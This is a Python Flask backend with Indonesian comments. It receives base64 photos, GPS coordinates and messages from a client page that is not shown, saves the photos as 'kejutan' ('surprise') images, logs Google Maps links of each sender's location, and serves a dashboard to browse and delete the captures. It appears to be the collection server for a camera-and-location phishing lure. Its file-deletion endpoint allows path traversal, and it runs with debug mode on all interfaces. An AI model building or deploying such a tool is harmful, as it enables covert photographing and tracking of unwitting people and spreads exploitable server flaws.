import json
import base64
import os
import uuid
from flask import Flask, request, jsonify
from datetime import datetime
from flask import Flask, send_from_directory



IMAGE_DIR = "captured_images"
LOG_DIR = "captured_logs"

os.makedirs(IMAGE_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
app = Flask(__name__, static_folder='static')


@app.route('/api/delete-file', methods=['DELETE'])
def delete_file():
    """
    Endpoint untuk menghapus file (foto atau log JSON) dari server.
    Menerima body JSON: {"filename": "nama_file.ext", "type": "image" | "log"}
    """
    if not request.is_json:
        return jsonify({"message": "Payload harus berupa JSON"}), 400

    try:
        data = request.get_json()
        filename = data.get('filename')
        file_type = data.get('type')

        if not filename or file_type not in ['image', 'log']:
            return jsonify({"message": "Parameter 'filename' atau 'type' tidak valid."}), 400

        # Tentukan direktori dan path file
        if file_type == 'image':
            directory = IMAGE_DIR
        else: # file_type == 'log'
            directory = LOG_DIR
            
        file_path = os.path.join(directory, filename)

        # Cek apakah file ada sebelum menghapus
        if not os.path.exists(file_path):
            print(f" ⚠️ Gagal menghapus: File {filename} tidak ditemukan di {directory}")
            return jsonify({"message": "File tidak ditemukan.", "status": "not_found"}), 404

        # Lakukan penghapusan
        os.remove(file_path)
        print(f" ✅ File berhasil dihapus: {file_path}")
        
        return jsonify({
            "message": f"File {filename} ({file_type}) berhasil dihapus.",
            "status": "success"
        }), 200

    except Exception as e:
        print(f" ❌ Kesalahan saat mencoba menghapus file: {e}")
        return jsonify({"message": f"Kesalahan internal server: {str(e)}"}), 500

@app.route('/api/view-data', methods=['GET'])
def view_data():
    """
    Endpoint untuk menampilkan daftar gambar dan file log JSON
    dari folder captured_images dan captured_logs.
    """
    image_dir = "captured_images"
    log_dir = "captured_logs"

    # pastikan foldernya ada
    os.makedirs(image_dir, exist_ok=True)
    os.makedirs(log_dir, exist_ok=True)

    # ambil semua file gambar
    images = [f for f in os.listdir(image_dir) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
    # ambil semua file json log
    logs = [f for f in os.listdir(log_dir) if f.lower().endswith('.json')]

    return jsonify({
        "images": images,
        "logs": logs
    })


# Tentukan nama file HTML di lingkungan Canvas Anda
# PASTIKAN NAMA FILE INI SAMA PERSIS DENGAN FILE HTML ANDA
HTML_FILENAME = 'index.html'

# Path folder
CAPTURE_DIR = os.path.join(app.root_path, 'capture_images')
LOG_FILE = os.path.join(app.root_path, 'log', 'data.json')

# Endpoint ambil daftar foto
@app.route('/api/images', methods=['GET'])
def list_images():
    files = []
    for fname in os.listdir(CAPTURE_DIR):
        if fname.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
            files.append(fname)
    return jsonify(files)

# Endpoint ambil isi log JSON
@app.route('/api/log', methods=['GET'])
def get_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return jsonify(data)
    return jsonify({'error': 'log file not found'}), 404

# Endpoint untuk menampilkan file gambar langsung
@app.route('/capture_images/<path:filename>')
def serve_image(filename):
    return send_from_directory(CAPTURE_DIR, filename)

# Serve view.html biar bisa diakses langsung
@app.route('/view')
def view_page():
    return send_from_directory('static', 'view.html')

@app.route('/captured_images/<path:filename>')
def serve_captured_image(filename):
    return send_from_directory('captured_images', filename)

@app.route('/captured_logs/<path:filename>')
def serve_log_file(filename):
    return send_from_directory('captured_logs', filename)


# Variabel untuk melacak data yang diterima (simulasi penyimpanan)
# Ini adalah penyimpanan memori, bukan database.
received_data = {}
@app.route('/image/<filename>')
def get_image(filename):
    return send_from_directory('static/images', filename)

def save_location_to_file(location_data, capture_id):
    """
    Membuat tautan Google Maps dari data lokasi dan menyimpannya ke maps.txt.
    """
    if location_data and location_data != 'N/A':
        try:
            latitude = location_data.get('latitude')
            longitude = location_data.get('longitude')
            
            # Format link Google Maps
            map_link = f"https://maps.google.com/?q={latitude},{longitude}"
            
            # Buat baris log
            log_line = f"[{datetime.now().isoformat()}] ID: {capture_id} | Lokasi: {map_link}\n"
            
            # Tulis ke file maps.txt
            with open("maps.txt", "a") as f:
                f.write(log_line)
                
            print(f"   ✅ Link lokasi berhasil ditulis ke maps.txt")
            return map_link
        except Exception as e:
            print(f"   ❌ Gagal menulis link lokasi ke maps.txt: {e}")
            return None
    return None

def save_metadata_log(data_to_store, capture_id):
    """
    Menyimpan semua metadata penangkapan (lokasi, waktu, path file) 
    ke file JSON yang unik di folder 'captured_logs'.
    """
    try:
        save_dir = "captured_logs"
        os.makedirs(save_dir, exist_ok=True)
        
        filepath = os.path.join(save_dir, f"metadata_{capture_id}.json")
        
        # Simpan objek data ke file JSON dengan indentasi agar mudah dibaca
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data_to_store, f, indent=4) 
            
        print(f"   ✅ Metadata berhasil disimpan ke: {filepath}")
        return filepath
    except Exception as e:
        print(f"   ❌ Gagal menyimpan metadata log: {e}")
        return None


@app.route('/')
def serve_html():
    """
    Rute untuk melayani file HTML utama saat klien mengakses root (/).
    Ini mengatasi error 404 pada GET /.
    """
    try:
        # Buka dan baca konten file HTML
        with open(HTML_FILENAME, 'r', encoding='utf-8') as f:
            html_content = f.read()
        return html_content
    except FileNotFoundError:
        # Jika file HTML tidak ada, kembalikan pesan error
        return jsonify({"error": f"File '{HTML_FILENAME}' tidak ditemukan. Pastikan sudah ada di direktori yang sama."}), 404
    except Exception as e:
        return jsonify({"error": f"Gagal membaca file: {str(e)}"}), 500

@app.route('/api/capture', methods=['POST'])
def capture_data():
    """
    Rute API untuk menerima data JSON dari klien (foto, lokasi, pesan).
    Endpoint ini sesuai dengan BACKEND_URL di kode JavaScript.
    """
    global received_data
    
    # Memastikan request adalah JSON
    if not request.is_json:
        return jsonify({"message": "Payload harus berupa JSON"}), 400

    try:
        data = request.get_json()
        
        # Validasi dasar
        if 'image_base64' not in data:
            return jsonify({"message": "Data 'image_base64' hilang"}), 400

        # Buat ID unik untuk sesi data ini
        capture_id = str(uuid.uuid4())
        
        # Ekstrak data
        image_base64 = data['image_base64']
        timestamp = data.get('timestamp', 'N/A')
        location = data.get('location', 'N/A')
        message = data.get('message', 'N/A')
        
        # --- LOGIK PENGOLAHAN BACKEND ---
        
        # 1. Simpan link lokasi ke file maps.txt
        map_link = save_location_to_file(location, capture_id)

        # 2. Simpan data metadata ke memori (simulasi database)
        data_to_store = {
            "timestamp": timestamp,
            "location": location,
            "map_link": map_link,
            "message": message,
            "image_size_kb": len(image_base64) // 1024,
            "received_at_server": datetime.now().isoformat(),
            "file_path": None,
            "metadata_path": None # Jalur file JSON log
        }
        
        # 3. DECODE DAN SIMPAN FOTO KE DISK
        try:
            # Decode Base64 string menjadi byte (data biner foto)
            image_bytes = base64.b64decode(image_base64) 
            
            # Tentukan direktori penyimpanan
            save_dir = "captured_images"
            os.makedirs(save_dir, exist_ok=True) # Buat direktori jika belum ada
            
            # Buat nama file unik
            filepath = os.path.join(save_dir, f"kejutan_{capture_id}.jpg")
            
            # Tulis byte foto ke file .jpg
            with open(filepath, "wb") as f:
                f.write(image_bytes)
                
            print(f"   Foto berhasil disimpan ke: {filepath}")
            data_to_store['file_path'] = filepath
        
        except Exception as e:
            print(f"   ❌ Gagal menyimpan foto ke disk: {e}")
            
        # 4. SIMPAN SEMUA METADATA KE FILE LOG JSON
        metadata_path = save_metadata_log(data_to_store, capture_id)
        data_to_store['metadata_path'] = metadata_path

        # Simpan semua data, termasuk path file, ke memori
        received_data[capture_id] = data_to_store

        # 5. Log data ke konsol server untuk konfirmasi
        print("-" * 50)
        print(f"✅ DATA KEJUTAN DITERIMA (ID: {capture_id})")
        print(f"   Timestamp Klien: {timestamp}")
        
        if location and location != 'N/A':
            print(f"   Lokasi: Lat={location.get('latitude')}, Lon={location.get('longitude')}")
            print(f"   Tautan Peta: {map_link}")
        else:
            print("   Lokasi: Tidak Tersedia")
            
        print(f"   Pesan: {message}")
        print(f"   Ukuran Foto (Base64): {data_to_store['image_size_kb']} KB")
        print(f"   Jalur Foto: {data_to_store['file_path']}")
        print(f"   Jalur Metadata: {data_to_store['metadata_path']}")
        print("-" * 50)
        
        # 6. Mengirim respons sukses ke klien
        return jsonify({
            "message": "Data capture berhasil diproses oleh backend dan foto disimpan.",
            "status": "success",
            "id": capture_id,
            "received_at": datetime.now().isoformat()
        }), 200

    except Exception as e:
        print(f"❌ Kesalahan pemrosesan data di backend: {e}")
        return jsonify({"message": f"Kesalahan internal server: {str(e)}"}), 500

if __name__ == '__main__':
    # Pastikan file HTML ada sebelum menjalankan server
    if not os.path.exists(HTML_FILENAME):
        print(f"PERINGATAN: File HTML '{HTML_FILENAME}' tidak ditemukan. Pastikan Anda memiliki file HTML dengan nama tersebut.")
    
    # Jalankan aplikasi. host='0.0.0.0' agar dapat diakses dari luar localhost
    # Debug=True aktifkan mode development
    app.run(debug=True, host='0.0.0.0', port=8080)
